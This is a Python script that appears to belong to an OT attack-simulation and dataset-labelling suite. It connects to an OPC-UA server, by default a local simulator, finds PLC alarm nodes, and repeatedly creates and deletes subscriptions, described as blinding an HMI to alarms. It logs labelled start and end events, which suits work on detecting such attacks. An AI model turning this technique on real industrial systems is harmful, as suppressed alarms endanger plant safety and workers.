"""
HMI_ALARM_SUPPRESS
Kỹ thuật: Delete OPC-UA subscription -> HMI mat alarm.
Yêu cầu: opcua_sim_server đang chạy.

Gọi từ bash:
  python -m attacks_ext.hmi_alarm_suppress \
      --duration 300 --opc-url opc.tcp://127.0.0.1:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import asyncio
import time
from attacks_ext.config_ext import base_parser, write_label


class _Handler:
    def datachange_notification(self, node, val, data):
        pass


async def _run(args):
    label_prefix = "HMI_ALARM_SUPPRESS"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s opc={args.opc_url}")

    cycles = 0

    try:
        from asyncua import Client

        async with Client(url=args.opc_url) as client:
            ns_idx = await client.get_namespace_index("PLC")
            print(f"[+] OPC-UA connected, PLC namespace = {ns_idx}")

            # Find alarm or any node to subscribe
            sub_nodes = []
            try:
                alarms = await client.nodes.objects.get_child(f"{ns_idx}:PLC/Alarms")
                for child in await alarms.get_children():
                    sub_nodes.append(child)
            except Exception:
                plc = await client.nodes.objects.get_child(f"{ns_idx}:PLC")
                child = await (await plc.get_children()).__anext__()
                sub_nodes.append(child)

            end_time = time.time() + args.duration
            while time.time() < end_time:
                # Create subscription
                handler = _Handler()
                sub = await client.create_subscription(100, handler)
                for node in sub_nodes:
                    await sub.subscribe_data_change(node)
                print(f"  [SUB] Created subscription, {len(sub_nodes)} nodes")
                await asyncio.sleep(3)

                # Delete (attack)
                await sub.delete()
                print(f"  [DEL] Subscription deleted — HMI blind to alarms")
                cycles += 1
                await asyncio.sleep(5)

    except ImportError:
        print("[ERR] asyncua not installed: pip install asyncua cryptography")
    except ConnectionRefusedError:
        print(f"[ERR] OPC-UA server not running at {args.opc_url}")
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"cycles={cycles}")


def run(args):
    asyncio.run(_run(args))


def main():
    p = base_parser("HMI Alarm Suppress (OPC-UA Subscription)")
    p.add_argument("--opc-url", default="opc.tcp://127.0.0.1:4840")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
